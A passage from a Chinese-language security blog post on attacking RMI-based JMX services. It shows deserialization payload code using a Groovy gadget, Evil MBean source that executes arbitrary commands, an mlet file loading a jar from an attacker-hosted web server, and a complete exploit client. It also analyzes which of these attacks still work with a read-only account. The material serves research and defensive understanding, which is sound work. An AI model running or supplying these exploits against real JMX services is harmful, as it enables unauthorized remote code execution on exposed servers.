+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">String serverName = <span class="hljs-string">&quot;192.168.232.145&quot;</span>;<br>String servicePort = <span class="hljs-string">&quot;2222&quot;</span>;<br>JMXServiceURL url = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://&quot;</span> + <span class="hljs-params">serverName</span> + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-params">servicePort</span> +  <span class="hljs-string">&quot;/jmxrmi&quot;</span>)</span>;<br>JMXConnector jmxConnector = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span>connect(url);<br>MBeanServerConnection mbeanServerConnection = jmxConnector.get<span class="hljs-constructor">MBeanServerConnection()</span>;<br>Object payloadObject = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utils</span>.</span></span>make<span class="hljs-constructor">PayloadObject(<span class="hljs-string">&quot;Groovy1&quot;</span>, <span class="hljs-string">&quot;mspaint.exe&quot;</span>)</span>;<br>ObjectName mbeanName = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectName(<span class="hljs-string">&quot;java.util.logging:type=Logging&quot;</span>)</span>;<br>mbeanServerConnection.invoke(mbeanName, <span class="hljs-string">&quot;getLoggerLevel&quot;</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;payloadObject&#125;, <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">CanonicalName()</span>&#125;);<br>jmxConnector.close<span class="hljs-literal">()</span>;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/22.png" srcset="/img/loading.gif" lazyload></p>
+<p>jconsole查看java.util.logging:type&#x3D;Logging为默认的MBean，另外还有很多MBean的方法也可以用：java.lang:type&#x3D;Threading#getThreadCpuTime、java.lang:type&#x3D;Threading#getThreadInfo、com.sun.management:type&#x3D;DiagnosticCommand#gcClassHistogram等等</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/23.png" srcset="/img/loading.gif" lazyload></p>
+<p>com.sun.management:type&#x3D;DiagnosticCommand#gcClassHistogram利用</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/24.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="2-5-MLET动态加载Evil-MBean利用方式"><a href="#2-5-MLET动态加载Evil-MBean利用方式" class="headerlink" title="2.5 MLET动态加载Evil MBean利用方式"></a>2.5 MLET动态加载Evil MBean利用方式</h3><p>除了利用本身存在的MBean，我们也可以自行添加MBean进行利用，可以使用<code>javax.management.loading.MLet</code> MBean 并调用其getMBeansFromURL操作指示JMX服务端从远端加载注册构建的恶意MBean，这样就可以调用我们创建的的MBean操作而不需要服务端ClassPath存在Gadget。这种从外部加载MBean的方式在官方也有说明 <a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html">https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html</a></p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/25.png" srcset="/img/loading.gif" lazyload></p>
+<p>分析下getMBeansFromURL方法是如何操作的，javax.management.loading.MLet#getMBeansFromURL(java.lang.String)中分为2步：</p>
+<p>1、加载mlet文件解析标签</p>
+<p>2、当创建MBean指定的class在本地ClassPath中找不到时，则使用MLET classloader去外部地址（第一步得到的codebase+archive属性值）进行加载</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/26.png" srcset="/img/loading.gif" lazyload></p>
+<p>javax.management.loading.MLetParser#parse解析<code>&lt;mlet&gt;</code>标签的内容并放入attributes</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/27.png" srcset="/img/loading.gif" lazyload></p>
+<p>接着返回到getMBeansFromURL方法调用com.sun.jmx.mbeanserver.JmxMBeanServer#createMBean创建MBean</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/28.png" srcset="/img/loading.gif" lazyload></p>
+<p>调用到com.sun.jmx.interceptor.DefaultMBeanServerInterceptor#createMBean创建MBean时，会检查是否有instantiate、registerMBean权限。如果未开启SecurityManager，则会跳过检查</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/29.png" srcset="/img/loading.gif" lazyload></p>
+<p>最终在 com.sun.jmx.mbeanserver.MBeanInstantiator#loadClass中使用MLET classloader去加载org.example.Evil类（codesource就是mlet文件中codebase+archive属性值）。这里使用<code>Class.forName(className, false, loader);</code>初始化的选项为false，不会执行静态代码块中的代码。所以我们需要选择invoke调用MBean的恶意方法进行利用</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/30.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/31.png" srcset="/img/loading.gif" lazyload></p>
+<p>针对前文在2222端口开启的JMX服务，复现下MLET这种利用方法：</p>
+<p>1、创建Evil类及EvilMBean接口（恶意操作为runCommand），并将其打包为JmxEvilBean.jar</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">//EvilMBean.java</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">EvilMBean</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> runCommand(<span class="hljs-keyword">String</span> cmd);<br>&#125;<br><br><span class="hljs-comment">//Evil.java</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> <span class="hljs-keyword"><span class="hljs-keyword">implements</span> <span class="hljs-type">EvilMBean</span></span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> runCommand(<span class="hljs-keyword">String</span> cmd)<br>    &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime rt = Runtime.getRuntime();<br>            Process proc = rt.exec(cmd);<br>            BufferedReader stdInput = <span class="hljs-keyword">new</span> <span class="hljs-type">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">InputStreamReader</span>(proc.getInputStream()));<br>            BufferedReader stdError = <span class="hljs-keyword">new</span> <span class="hljs-type">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">InputStreamReader</span>(proc.getErrorStream()));<br>            <span class="hljs-keyword">String</span> stdout_err_data = <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">String</span> s;<br>            <span class="hljs-keyword">while</span> ((s = stdInput.readLine()) != <span class="hljs-literal">null</span>)<br>            &#123;<br>                stdout_err_data += s+<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">while</span> ((s = stdError.readLine()) != <span class="hljs-literal">null</span>)<br>            &#123;<br>                stdout_err_data += s+<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>            proc.waitFor();<br>            <span class="hljs-keyword">return</span> stdout_err_data;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)<br>        &#123;<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>2、创建MLET文件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;mlet <span class="hljs-attribute">code</span>=<span class="hljs-string">&quot;org.example.Evil&quot;</span> <span class="hljs-attribute">archive</span>=<span class="hljs-string">&quot;JmxEvilBean.jar&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;MLetCompromise:name=evil,id=10&quot;</span> <span class="hljs-attribute">codebase</span>=<span class="hljs-string">&quot;http://192.168.232.1:3333&quot;</span>&gt;&lt;/mlet&gt;<br></code></pre></td></tr></table></figure>
+
+<p>将JmxEvilBean.jar、mlet文件放在web服务下：python -m SimpleHTTPServer 3333</p>
+<p>3、EXP利用：连接服务、创建MLet MBean、invoke调用getMBeansFromURL加载外部Evil MBean、invoke调用Evil MBean的runCommand操作返回执行结果</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">String serverName = <span class="hljs-string">&quot;192.168.232.145&quot;</span>;<br>String port = <span class="hljs-string">&quot;2222&quot;</span>;<br>String command = <span class="hljs-string">&quot;ipconfig&quot;</span>;<br><span class="hljs-comment">//1、连接JMX服务</span><br>JMXServiceURL u = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://&quot;</span> + <span class="hljs-params">serverName</span> + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-params">port</span> + <span class="hljs-string">&quot;/jmxrmi&quot;</span>)</span>;<br>JMXConnector c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span>connect(u);<br>MBeanServerConnection m = c.get<span class="hljs-constructor">MBeanServerConnection()</span>;<br><span class="hljs-comment">//2、创建MBean,类为javax.management.loading.MLet、name为test.Mbean:type=MLet,id=1</span><br>ObjectInstance evil = m.create<span class="hljs-constructor">MBean(<span class="hljs-string">&quot;javax.management.loading.MLet&quot;</span>, <span class="hljs-params">new</span> ObjectName(<span class="hljs-string">&quot;test.Mbean:type=MLet,id=1&quot;</span>)</span>);<br><span class="hljs-comment">//3、调用MBean的getMBeansFromURL操作，从http://192.168.232.1:3333/mlet加载mlet文件创建新的MBean</span><br>Object res = m.invoke(evil.get<span class="hljs-constructor">ObjectName()</span>, <span class="hljs-string">&quot;getMBeansFromURL&quot;</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;http://192.168.232.1:3333/mlet&quot;</span>&#125;,<span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span> &#123; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span> &#125; );<br><br>HashSet res_set = ((HashSet)res);<br>Iterator itr = res_set.iterator<span class="hljs-literal">()</span>;<br>Object nextObject = itr.next<span class="hljs-literal">()</span>;<br><span class="hljs-comment">//4、invoke调用新的MBean的runCommand操作并返回结果</span><br>ObjectInstance evil_bean = ((ObjectInstance)nextObject);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Loaded class: &quot;</span>+evil_bean.get<span class="hljs-constructor">ClassName()</span>+<span class="hljs-string">&quot; object &quot;</span>+evil_bean.get<span class="hljs-constructor">ObjectName()</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Calling runCommand with: &quot;</span>+command);<br>Object result = m.invoke(evil_bean.get<span class="hljs-constructor">ObjectName()</span>, <span class="hljs-string">&quot;runCommand&quot;</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123; command &#125;, <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span> &#125;);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Result: &quot;</span>+result);<br></code></pre></td></tr></table></figure>
+
+<p>exp运行后，可以在jconsole中看到创建的test.Mbean:type&#x3D;MLet,id&#x3D;1、MLetCompromise:name&#x3D;evil,id&#x3D;10 MBean</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/32.png" srcset="/img/loading.gif" lazyload></p>
+<p>EXP也回显了ipconfig命令执行的结果</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/33.png" srcset="/img/loading.gif" lazyload></p>
+<p>需要注意的是：当服务未重启的情况下，后续利用直接invoke调用runCommand就可以了，不需要再次创建MBean</p>
+<h2 id="3、密码验证"><a href="#3、密码验证" class="headerlink" title="3、密码验证"></a>3、密码验证</h2><p>第二章节分析的是JMX服务未开启权限验证及SSL验证时的漏洞利用情况，另外分析下当开启权限验证时漏洞利用的情况有什么变化。默认启动JMX管理服务时（不指定com.sun.management.jmxremote.authenticate配置），远程客户端连接时就需要通过验证。而验证所需的密码-权限是以明文存储在服务端&#x2F;jre&#x2F;lib&#x2F;management&#x2F;目录的jmxremote.password、jmxremote.access文件中的，且需要设置这两个文件的权限为：除文件所有者具有控制权，其它用户无任何权限。否则启动时会报错：sun.management.AgentConfigurationError。如下是启动命令</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -Xmx5g -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=<span class="hljs-number">5005</span> -Dcom.sun.management.jmxremote.port=<span class="hljs-number">2222</span> -Dcom.sun.management.jmxremote.ssl=false -cp jmxserver.jar;C:\tools\apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">6</span>-repository\org\codehaus\groovy\groovy\<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>\groovy-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>.jar org.example.MBeanExample<br></code></pre></td></tr></table></figure>
+
+<p>启动截图及文件权限如下：</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/34.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用客户端jconsole 以只读账户guest password1进行连接</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/35.png" srcset="/img/loading.gif" lazyload></p>
+<p>也可以使用JAVA代码连接：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">HashMap env = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;<br>env.put(<span class="hljs-string">&quot;jmx.remote.credentials&quot;</span>,<span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;guest&quot;</span>,<span class="hljs-string">&quot;password1&quot;</span>&#125;);<br>JMXServiceURL u = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://192.168.232.145:2222/jmxrmi&quot;</span>)</span>;<br>JMXConnector c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span>connect(u,env);<br>MBeanServerConnection m = c.get<span class="hljs-constructor">MBeanServerConnection()</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(m.get<span class="hljs-constructor">MBeanCount()</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/36.png" srcset="/img/loading.gif" lazyload></p>
+<p>文件权限设置参考：<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/7/docs/technotes/guides/management/security-windows.html">https://docs.oracle.com/javase/7/docs/technotes/guides/management/security-windows.html</a></p>
+<p>分析下当加入权限验证后，JMX服务端的检测逻辑是怎样的？当我们获取了一个低权限&#x2F;只读权限账户时可以做哪些事情？我们从连接服务端到执行MBean操作的整体流程来看，分为几步：</p>
+<p>1、客户端使用javax.naming.InitialContext#lookup获取到名称为”jmxrmi”的 Stub代理对象，即下图的变量server；</p>
+<p>2、客户端调用javax.management.remote.rmi.RMIServer#newClient去获取RMIConnectionImpl Stub代理对象，服务端javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper#newClient执行JAAS-based authenticator进行权限校验：根据服务的启动参数及jmxremote.password、jmxremote.access配置文件去匹配，当校验通过后返回代理对象，即下图的变量c；</p>
+<p>3、客户端invoke调用RMIConnectionImpl Stub代理对象的方法去操作MBean&#x2F;获取MBean信息。在另一边的JMX服务端会根据objid确认处理客户端此次请求逻辑的Target，[0:0:0,0]、[0:0:0,2] 这是在之前攻击RMI中分析过的RegistryImpl_Stub、DGCImpl_Stub，而涉及JMX是另外几个Target，在本实例中的objID为：[613d5ccd:18470553d20:-7fff, -4868886411976892153]、[613d5ccd:18470553d20:-7ffa, -8893277592355947578]，如下图是客户端拿到两次请求的返回对象调试情况</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/37.png" srcset="/img/loading.gif" lazyload></p>
+<p>当调用MBean的具体操作方法时，如javax.management.remote.rmi.RMIConnection#getConnectionId，在服务端会调用到javax.management.remote.rmi.RMIConnectionImpl#getConnectionId进行处理</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/38.png" srcset="/img/loading.gif" lazyload></p>
+<p>添加鉴权前后，由于服务端在启动时添加的Target不同，在添加鉴权后 mbeanServer的值从DefaultMBeanServerInterceptor变为MBeanServerAccessController，对于每个操作具体需要的权限都在MBeanServerAccessController中进行判断（objid与上面演示的不同，因为是后面的补图）</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/39.png" srcset="/img/loading.gif" lazyload></p>
+<p>无鉴权时：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#createMBean</span>(java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span>, javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.ObjectName</span>, javax<span class="hljs-selector-class">.security</span><span class="hljs-selector-class">.auth</span>.Subject)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doPrivilegedOperation</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnectionImpl</span>.PrivilegedOperation<span class="hljs-selector-id">#run</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doOperation</span><br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jmx</span><span class="hljs-selector-class">.interceptor</span>.DefaultMBeanServerInterceptor<span class="hljs-selector-id">#createMBean</span>(<br>....<br></code></pre></td></tr></table></figure>
+
+<p>有鉴权时：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#createMBean</span>(java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span>, javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.ObjectName</span>, javax<span class="hljs-selector-class">.security</span><span class="hljs-selector-class">.auth</span>.Subject)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doPrivilegedOperation</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnectionImpl</span>.PrivilegedOperation<span class="hljs-selector-id">#run</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doOperation</span><br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jmx</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.security</span>.MBeanServerAccessController<span class="hljs-selector-id">#createMBean</span>   当加上鉴权后在这里发生了变化<br>...<br></code></pre></td></tr></table></figure>
+
+<p>翻了下源码统计下jmx配置文件中的权限可对应调用MBean的哪些操作。这些操作可以辅助我们对JMX服务进行进一步的测试：</p>
+<p>read权限可执行的操作</p>
+<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">getAttribute、getAttributes、getDefaultDomain、getDomains、getMBeanCount、getMBeanInfo、getObjectInstance、isInstanceOf、isRegistered、<span class="hljs-keyword">query</span>MBeans、<span class="hljs-keyword">query</span>Names、addNotificationListener、removeNotificationListener<br></code></pre></td></tr></table></figure>
+
+<p>Write权限可执行的操作</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">set</span>Attribute、<span class="hljs-keyword">set</span>Attributes<br></code></pre></td></tr></table></figure>
+
+<p>Unregister权限可执行的操作</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">unregisterMBean</span><br></code></pre></td></tr></table></figure>
+
+<p>write权限、非MLet#addURL&#x2F;getMBeansFromURL方法可执行的操作</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">invoke</span><br></code></pre></td></tr></table></figure>
+
+<p>read权限可以执行查询操作，如列出全部MBean的信息</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/40.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们以低权限账户guest登录后再次测试如上几种利用方式</p>
+<h3 id="3-1-影响地址可控的JNDI注入-amp-RMI-Registry利用方式-amp-CVE-2016-3427"><a href="#3-1-影响地址可控的JNDI注入-amp-RMI-Registry利用方式-amp-CVE-2016-3427" class="headerlink" title="3.1 影响地址可控的JNDI注入 &amp; RMI Registry利用方式 &amp; CVE-2016-3427"></a>3.1 影响地址可控的JNDI注入 &amp; RMI Registry利用方式 &amp; CVE-2016-3427</h3><p>地址可控的JNDI注入利用在密码鉴权流程之前，与是否鉴权无关，只与JDK版本有关</p>
+<p>RMI方式的利用在密码鉴权流程之前，与是否鉴权无关，只与JDK版本有关</p>
+<p>CVE-2016-3427是在RMI层-还原自定义方法的参数时触发的，与是否鉴权无关，只与JDK版本有关</p>
+<h3 id="3-2-影响JMX层MBean方法的利用方式"><a href="#3-2-影响JMX层MBean方法的利用方式" class="headerlink" title="3.2 影响JMX层MBean方法的利用方式"></a>3.2 影响JMX层MBean方法的利用方式</h3><p>由于通过JMX层MBean方法getLoggerLevel&#x2F;gcClassHistogram利用方式是在javax.management.remote.rmi.RMIConnectionImpl#invoke 还原参数时触发的漏洞，并未执行到判断权限的位置。所以使用只读权限的guest账户即可继续进行利用</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/41.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="3-3-影响MLET加载Evil-MBean利用方式"><a href="#3-3-影响MLET加载Evil-MBean利用方式" class="headerlink" title="3.3 影响MLET加载Evil MBean利用方式"></a>3.3 影响MLET加载Evil MBean利用方式</h3><p>当未授权情况下JMX服务下MLET方式利用的步骤</p>
+<p>1、客户端调用<code>JMXConnectorFactory.connect</code>连接到JMX服务端</p>
+<p>2、调用createMBean创建javax.management.loading.MLet MBean</p>
+<p>3、invoke调用MLet#getMBeansFromURL操作从外部获取Evil MBean</p>
+<p>4、invoke调用Evil MBean的runCommand操作执行命令</p>
+<p>当以低权限账户登录后，在第2步com.sun.jmx.remote.security.MBeanServerAccessController#createMBean创建bean的起点使用<code>checkCreate(className)</code>检查权限，执行到com.sun.jmx.remote.security.MBeanServerFileAccessController#checkAccess代码逻辑：1、获取当前登录用户的权限；2、判断权限是否包括create权限；3、如果无create权限或未登录用户则报错：<code>Access denied! Invalid access level for requested MBeanServer operation</code></p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/42.png" srcset="/img/loading.gif" lazyload></p>
+<p>而我们登录使用的guest用户只有read权限，没法执行createBean操作，所以在执行EXP的客户端报错：</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/43.png" srcset="/img/loading.gif" lazyload></p>
+<p>另外如果登录用户有create权限还是不能invoke调用MLet#getMBeansFromURL操作的，因为在invoke前会检查write、MLetMethods权限，write权限与上面判断read权限的流程一致，而MLetMethods权限是在com.sun.jmx.remote.security.MBeanServerAccessController#checkMLetMethods中判断的，如果调用javax.management.loading.MLet的addURL&#x2F;getMBeansFromURL都会报错退出</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/44.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h2><p><a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/853f699a5273">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/853f699a5273</a></p>
+<p><a target="_blank" rel="noopener" href="https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/">https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/afanti/p/12468693.html">https://www.cnblogs.com/afanti/p/12468693.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/veracode-research/solr-injection#2-cve-2019-0192-deserialization-of-untrusted-data-via-jmxserviceurl">https://github.com/veracode-research/solr-injection#2-cve-2019-0192-deserialization-of-untrusted-data-via-jmxserviceurl</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">代码审计</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/JMX/">#JMX</a>
+      
+        <a href="/tags/JavaSec/">#JavaSec</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Attack JMX Service的打开方式</div>
+      <div>https://pwnull.github.io/2022/How-to-attack-RMI-based-JMX-services/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>pwnull</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年11月19日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
